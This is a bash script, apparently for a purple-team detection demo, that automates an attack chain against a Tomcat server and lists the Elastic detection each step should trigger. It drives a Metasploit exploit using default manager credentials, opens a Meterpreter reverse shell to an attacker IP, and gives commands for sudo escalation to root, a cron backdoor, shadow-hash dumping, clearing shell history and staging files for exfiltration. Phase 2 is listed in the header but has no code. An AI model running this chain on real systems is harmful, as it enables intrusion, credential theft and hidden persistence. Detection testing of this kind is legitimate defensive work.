#!/bin/bash
################################################################################
# Tomcatastrophe - Automated Purple Team Attack Script
################################################################################
#
# This script automates the attack chain for the Elastic Security purple team demo.
# It progresses through the full MITRE ATT&CK kill chain targeting a vulnerable
# Tomcat server.
#
# Usage:
#   # Run all phases automatically
#   ./tomcatastrophe.sh --target 10.0.1.50 --attacker 10.0.1.100 --auto
#
#   # Run individual phase (interactive)
#   ./tomcatastrophe.sh --target 10.0.1.50 --attacker 10.0.1.100 --phase 1
#
#   # List available phases
#   ./tomcatastrophe.sh --list
#
# Prerequisites:
#   - Nmap installed (apt install nmap)
#   - Metasploit Framework installed (msfconsole)
#   - Target must have vulnerable Tomcat 9.0.30 with weak credentials
#   - Network connectivity between attacker and target
#
# Attack Phases:
#   0 - Reconnaissance (T1046 - Network Service Discovery)
#   1 - Initial Access (T1190 - Exploit Public-Facing Application)
#   2 - Execution (T1059 - Command and Scripting Interpreter)
#   3 - Discovery (T1082, T1033 - System/User Discovery)
#   4 - Privilege Escalation (T1548 - Abuse Elevation Control)
#   5 - Persistence (T1053.003 - Cron Job)
#   6 - Credential Access (T1003.008 - /etc/passwd and /etc/shadow)
#   7 - Defense Evasion (T1070.003 - Clear Command History)
#   8 - Collection (T1074.001 - Local Data Staging)
#
# Expected Detections (Elastic 9.2):
#   1. Potential SYN-Based Port Scan Detected (OOTB)
#   2. Tomcat Manager Web Shell Deployment (Custom)
#   3. Potential Reverse Shell via Java (OOTB)
#   4. Linux System Information Discovery via Getconf (OOTB)
#   5. Sudo Command Enumeration Detected (OOTB)
#   6. Cron Job Created or Modified (OOTB)
#   7. Potential Shadow File Read via Command Line Utilities (OOTB)
#   8. Tampering of Shell Command-Line History (OOTB)
#   9. Sensitive Files Compression (OOTB)
#
################################################################################

set -e  # Exit on error

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Global variables
TARGET_IP=""
ATTACKER_IP=""
INTERACTIVE=true
PHASE=""

################################################################################
# Helper Functions
################################################################################

log_info() {
    echo -e "${BLUE}[INFO]${NC} $1"
}

log_success() {
    echo -e "${GREEN}[SUCCESS]${NC} $1"
}

log_warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

log_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

log_phase() {
    echo ""
    echo -e "${MAGENTA}================================================================================${NC}"
    echo -e "${MAGENTA}$1${NC}"
    echo -e "${MAGENTA}================================================================================${NC}"
    echo ""
}

pause_interactive() {
    if [ "$INTERACTIVE" = true ]; then
        echo ""
        read -p "Press Enter to continue..."
        echo ""
    fi
}

pause_with_message() {
    if [ "$INTERACTIVE" = true ]; then
        echo ""
        read -p "$1"
        echo ""
    fi
}

################################################################################
# Phase 0: Reconnaissance (T1046 - Network Service Discovery)
################################################################################

phase_0_reconnaissance() {
    log_phase "PHASE 0: RECONNAISSANCE (T1046 - Network Service Discovery)"

    log_info "TCP port scan to identify open services"
    log_warning "Expected Detection: Potential SYN-Based Port Scan Detected"

    pause_interactive

    # TCP connect scan on common ports
    log_info "Running nmap scan on target: $TARGET_IP"
    nmap -sT -p 22,80,443,8080,8443 --open "$TARGET_IP"

    log_success "✓ Port scanning complete"
    pause_with_message "Review nmap results. Press Enter to continue to Initial Access..."
}

################################################################################
# Phase 1: Initial Access (T1190 - Exploit Public-Facing Application)
################################################################################

phase_1_initial_access() {
    log_phase "PHASE 1: INITIAL ACCESS (T1190 - Exploit Public-Facing Application)"

    log_info "Exploiting Tomcat Manager with weak credentials (tomcat/tomcat)"
    log_warning "Expected Detections:"
    log_warning "  - Tomcat Manager Web Shell Deployment (Custom)"
    log_warning "  - Potential Reverse Shell via Java (OOTB)"

    pause_interactive

    # Create Metasploit resource script
    RC_FILE=$(mktemp /tmp/tomcat_exploit_XXXXXX.rc)
    log_info "Creating Metasploit resource script: $RC_FILE"

    cat > "$RC_FILE" << EOF
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS $TARGET_IP
set HttpUsername tomcat
set HttpPassword tomcat
set LHOST $ATTACKER_IP
set LPORT 4444
set payload java/meterpreter/reverse_tcp
show options
exploit -z
EOF

    log_info "Starting Metasploit Framework..."
    log_warning "NOTE: Metasploit will run interactively. Type 'exit' when done."

    # Run Metasploit
    msfconsole -r "$RC_FILE"

    # Cleanup
    rm -f "$RC_FILE"

    log_success "✓ Initial access phase complete"
    log_info "You should now have a Meterpreter session"
    pause_with_message "Press Enter to continue to Discovery..."
}

################################################################################
# Phase 3: Discovery (T1082, T1033 - System/User Discovery)
################################################################################

phase_3_discovery() {
    log_phase "PHASE 3: DISCOVERY (T1082, T1033 - System/User Discovery)"

    log_info "System and user information discovery"
    log_warning "Expected Detection: Linux System Information Discovery via Getconf"

    pause_interactive

    log_info "Run these commands in your Meterpreter shell session:"

    cat << 'EOF'

    shell
    whoami
    id
    uname -a
    hostname
    cat /etc/passwd | grep -v nologin

    # Enumerate system configuration using getconf
    getconf -a
    getconf LONG_BIT
    getconf PAGE_SIZE

    exit

EOF

    pause_with_message "After running discovery commands, press Enter to continue..."
}

################################################################################
# Phase 4: Privilege Escalation (T1548 - Abuse Elevation Control)
################################################################################

phase_4_privilege_escalation() {
    log_phase "PHASE 4: PRIVILEGE ESCALATION (T1548 - Abuse Elevation Control)"

    log_info "Sudo privilege enumeration and escalation"
    log_warning "Expected Detection: Sudo Command Enumeration Detected"

    pause_interactive

    log_info "Run these commands in your Meterpreter shell session:"

    cat << 'EOF'

    shell

    # Enumerate sudo permissions
    sudo -l
    sudo -V

    # Escalate to root
    sudo /bin/bash
    whoami    # Should show 'root'

    exit

EOF

    pause_with_message "After privilege escalation, press Enter to continue..."
}

################################################################################
# Phase 5: Persistence (T1053.003 - Cron Job)
################################################################################

phase_5_persistence() {
    log_phase "PHASE 5: PERSISTENCE (T1053.003 - Cron Job)"

    log_info "Establishing persistent backdoor via cron"
    log_warning "Expected Detection: Cron Job Created or Modified"

    pause_interactive

    log_info "Run these commands in msfconsole:"

    cat << EOF

    background

    use exploit/linux/local/persistence_cron
    set SESSION 1
    set LHOST $ATTACKER_IP
    set LPORT 4445
    run

EOF

    pause_with_message "After establishing persistence, press Enter to continue..."
}

################################################################################
# Phase 6: Credential Access (T1003.008 - /etc/passwd and /etc/shadow)
################################################################################

phase_6_credential_access() {
    log_phase "PHASE 6: CREDENTIAL ACCESS (T1003.008 - Password Hash Dumping)"

    log_info "Dumping password hashes from /etc/shadow"
    log_warning "Expected Detection: Potential Shadow File Read via Command Line Utilities"

    pause_interactive

    log_info "Run these commands in msfconsole:"

    cat << 'EOF'

    use post/linux/gather/hashdump
    set SESSION 1
    run

    # View collected credentials
    loot
    creds

EOF

    pause_with_message "After credential dumping, press Enter to continue..."
}

################################################################################
# Phase 7: Defense Evasion (T1070.003 - Clear Command History)
################################################################################

phase_7_defense_evasion() {
    log_phase "PHASE 7: DEFENSE EVASION (T1070.003 - Clear Command History)"

    log_info "Tampering with shell command history"
    log_warning "Expected Detection: Tampering of Shell Command-Line History"

    pause_interactive

    log_info "Run these commands in your Meterpreter shell session:"

    cat << 'EOF'

    sessions -i 1
    shell

    unset HISTFILE
    export HISTSIZE=0
    history -c

    exit

EOF

    pause_with_message "After clearing history, press Enter to continue..."
}

################################################################################
# Phase 8: Collection (T1074.001 - Local Data Staging)
################################################################################

phase_8_collection() {
    log_phase "PHASE 8: COLLECTION (T1074.001 - Local Data Staging)"

    log_info "Staging sensitive files and compressing for exfiltration"
    log_warning "Expected Detection: Sensitive Files Compression"

    pause_interactive

    log_info "Run these commands in your Meterpreter shell session:"

    cat << 'EOF'

    shell

    # Stage sensitive files in hidden directory
    mkdir /tmp/.staging
    find /home -name "*.pdf" -exec cp {} /tmp/.staging/ \; 2>/dev/null
    find /home -name "*.doc*" -exec cp {} /tmp/.staging/ \; 2>/dev/null
    find /etc -name "*.conf" -exec cp {} /tmp/.staging/ \; 2>/dev/null

    # Compress staged data for exfiltration
    tar -czf /tmp/data.tar.gz /tmp/.staging
    zip -r /tmp/backup.zip /tmp/.staging 2>/dev/null

    exit

EOF

    pause_with_message "Data staging complete. Press Enter to finish..."
}

################################################################################
# Main Execution Logic
################################################################################

run_all_phases() {
    phase_0_reconnaissance
    phase_1_initial_access
    phase_3_discovery
    phase_4_privilege_escalation
    phase_5_persistence
    phase_6_credential_access
    phase_7_defense_evasion
    phase_8_collection

    log_phase "ATTACK CHAIN COMPLETE"
    log_success "✓ All phases executed"
    log_info "Check Elastic Security UI (ec-dev) for triggered detections"
}

run_specific_phase() {
    case $PHASE in
        0)
            phase_0_reconnaissance
            ;;
        1)
            phase_1_initial_access
            ;;
        3)
            phase_3_discovery
            ;;
        4)
            phase_4_privilege_escalation
            ;;
        5)
            phase_5_persistence
            ;;
        6)
            phase_6_credential_access
            ;;
        7)
            phase_7_defense_evasion
            ;;
        8)
            phase_8_collection
            ;;
        *)
            log_error "Invalid phase number: $PHASE"
            log_info "Valid phases: 0, 1, 3, 4, 5, 6, 7, 8"
            exit 1
            ;;
    esac
}

list_phases() {
    cat << 'EOF'

Available Attack Phases:
========================

Phase 0: Reconnaissance (T1046)
  - TCP port scan with nmap
  - Detection: Potential SYN-Based Port Scan Detected

Phase 1: Initial Access (T1190)
  - Tomcat Manager exploitation with weak credentials
  - Meterpreter reverse shell deployment
  - Detections: Tomcat Web Shell, Reverse Shell via Java

Phase 3: Discovery (T1082, T1033)
  - System information enumeration with getconf
  - Detection: Linux System Information Discovery via Getconf

Phase 4: Privilege Escalation (T1548)
  - Sudo enumeration and escalation
  - Detection: Sudo Command Enumeration Detected

Phase 5: Persistence (T1053.003)
  - Cron-based backdoor installation
  - Detection: Cron Job Created or Modified

Phase 6: Credential Access (T1003.008)
  - Password hash dumping from /etc/shadow
  - Detection: Potential Shadow File Read

Phase 7: Defense Evasion (T1070.003)
  - Shell history clearing and tampering
  - Detection: Tampering of Shell Command-Line History

Phase 8: Collection (T1074.001)
  - Sensitive file staging and compression
  - Detection: Sensitive Files Compression

EOF
}

usage() {
    cat << EOF

Usage: $0 [OPTIONS]

Options:
  -t, --target IP       Target IP address (Blue Team VM)
  -a, --attacker IP     Attacker IP address (Red Team VM)
  -p, --phase N         Run specific phase (0-8)
  --auto                Run all phases automatically without pauses
  -l, --list            List available phases
  -h, --help            Show this help message

Examples:
  # Run all phases interactively
  $0 --target 10.0.1.50 --attacker 10.0.1.100

  # Run all phases automatically
  $0 --target 10.0.1.50 --attacker 10.0.1.100 --auto

  # Run only phase 1 (Initial Access)
  $0 --target 10.0.1.50 --attacker 10.0.1.100 --phase 1

  # List available phases
  $0 --list

EOF
}

################################################################################
# Parse Command Line Arguments
################################################################################

while [[ $# -gt 0 ]]; do
    case $1 in
        -t|--target)
            TARGET_IP="$2"
            shift 2
            ;;
        -a|--attacker)
            ATTACKER_IP="$2"
            shift 2
            ;;
        -p|--phase)
            PHASE="$2"
            shift 2
            ;;
        --auto)
            INTERACTIVE=false
            shift
            ;;
        -l|--list)
            list_phases
            exit 0
            ;;
        -h|--help)
            usage
            exit 0
            ;;
        *)
            log_error "Unknown option: $1"
            usage
            exit 1
            ;;
    esac
done

################################################################################
# Validate Arguments and Execute
################################################################################

# List phases if requested
if [ -z "$TARGET_IP" ] && [ -z "$ATTACKER_IP" ]; then
    usage
    exit 1
fi

# Validate IPs are provided
if [ -z "$TARGET_IP" ]; then
    log_error "Target IP address is required"
    usage
    exit 1
fi

if [ -z "$ATTACKER_IP" ]; then
    log_error "Attacker IP address is required"
    usage
    exit 1
fi

# Display configuration
log_info "Tomcatastrophe Attack Configuration"
log_info "Target IP: $TARGET_IP"
log_info "Attacker IP: $ATTACKER_IP"
log_info "Interactive Mode: $INTERACTIVE"

if [ -n "$PHASE" ]; then
    log_info "Running Phase: $PHASE"
else
    log_info "Running: All Phases"
fi

echo ""
pause_with_message "Press Enter to start the attack chain..."

# Execute
if [ -n "$PHASE" ]; then
    run_specific_phase
else
    run_all_phases
fi

log_success "Tomcatastrophe complete!"
